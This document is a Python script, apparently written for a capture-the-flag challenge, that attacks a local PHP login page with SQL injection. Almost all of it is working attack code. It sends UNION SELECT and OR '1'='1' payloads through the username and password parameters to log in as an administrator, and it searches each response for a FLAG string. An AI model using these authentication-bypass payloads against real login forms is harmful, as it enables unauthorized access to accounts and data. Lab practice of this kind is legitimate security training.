import requests
import re

target = "http://127.0.0.1:32895/index.php"

print("="*80)
print("HYPOTHESIS: Maybe 'admin' is not the right username to target")
print("Let's try UNION SELECT with different usernames")
print("="*80)

# Try different usernames in UNION
usernames_to_try = [
    'administrator',
    'root',
    'superuser',
    'superadmin',
    'sysadmin',
    'Admin',
    'ADMIN',
    'homer',  # Simpsons theme
    'simpson',
    'bart',
    'marge',
]

for uname in usernames_to_try:
    # UNION with 3 columns: username, password, is_admin
    payload = f"' UNION SELECT '{uname}','x',1-- -"
    params = {'username': payload, 'password': 'x'}
    resp = requests.get(target, params=params)
    
    flag_match = re.search(r'FLAG\{[^}]+\}', resp.text)
    
    if flag_match:
        print(f"\n[!!! FLAG FOUND with username='{uname}' !!!]")
        print(f"Payload: {payload}")
        print(f"Flag: {flag_match.group(0)}")
        print(f"\nFull Response:\n{resp.text}")
        exit(0)
    
    has_admin = "not the admin" in resp.text.lower()
    print(f"[{'✗' if has_admin else '✓'}] {uname:20s} | {'not admin' if has_admin else 'SUCCESS!'}")

# Maybe we need to inject in password field
print("\n" + "="*80)
print("Try injecting username via password field")
print("="*80)

payload_password = "' UNION SELECT 'admin','x',1-- -"
params = {'username': 'x', 'password': payload_password}
resp = requests.get(target, params=params)

flag_match = re.search(r'FLAG\{[^}]+\}', resp.text)

if flag_match:
    print(f"[!!! FLAG FOUND !!!]")
    print(f"Flag: {flag_match.group(0)}")
    print(resp.text)
    exit(0)

print(f"Password injection: {'not admin' if 'not the admin' in resp.text.lower() else 'different'}")

# Maybe the query returns multiple rows and we need the RIGHT one
print("\n" + "="*80)
print("Try injecting without closing the original query")
print("="*80)

alt_payloads = [
    "admin' UNION SELECT 'admin','x',1 WHERE '1'='1'-- -",
    "admin' OR username='admin' UNION SELECT 'admin','x',1-- -",
    "' OR '1'='1' UNION SELECT 'admin','x',1 LIMIT 1-- -",
]

for payload in alt_payloads:
    params = {'username': payload, 'password': 'x'}
    resp = requests.get(target, params=params)
    
    flag_match = re.search(r'FLAG\{[^}]+\}', resp.text)
    
    if flag_match:
        print(f"[!!! FLAG FOUND !!!]")
        print(f"Payload: {payload}")
        print(f"Flag: {flag_match.group(0)}")
        print(resp.text)
        exit(0)
    
    print(f"[✗] {payload[:60]}")

print("\n[NO FLAG FOUND]")

